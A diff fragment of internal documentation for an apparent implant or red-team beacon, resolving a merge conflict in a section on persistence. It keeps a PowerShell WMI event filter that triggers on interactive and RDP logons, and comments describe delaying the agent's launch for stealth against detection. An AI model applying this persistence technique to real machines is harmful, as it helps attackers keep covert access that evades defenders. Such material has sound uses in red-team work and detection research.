@@ -120,7 +120,6 @@ Multiple persistence methods implemented, from simple to APT-like:
 
 **Implementation:**
 ```powershell
-<<<<<<<< HEAD:docs/internal/PERSISTENCE_BEACON.md
 # Event Filter: Trigger when a user logs in (interactive or RDP)
 # LogonType 2 = Interactive (local console)
 # LogonType 10 = RemoteInteractive (RDP)
@@ -128,11 +127,6 @@ Multiple persistence methods implemented, from simple to APT-like:
 $Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 
           WHERE TargetInstance ISA 'Win32_LogonSession' 
           AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 10)"
-========
-# Event Filter: Trigger on system performance data
-$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 7200
-          WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
->>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f:docs/features/PERSISTENCE_BEACON.md
 
 # Consumer: Execute agent with random delay (2-5 minutes) for stealth
 # The delay prevents correlation with logon events
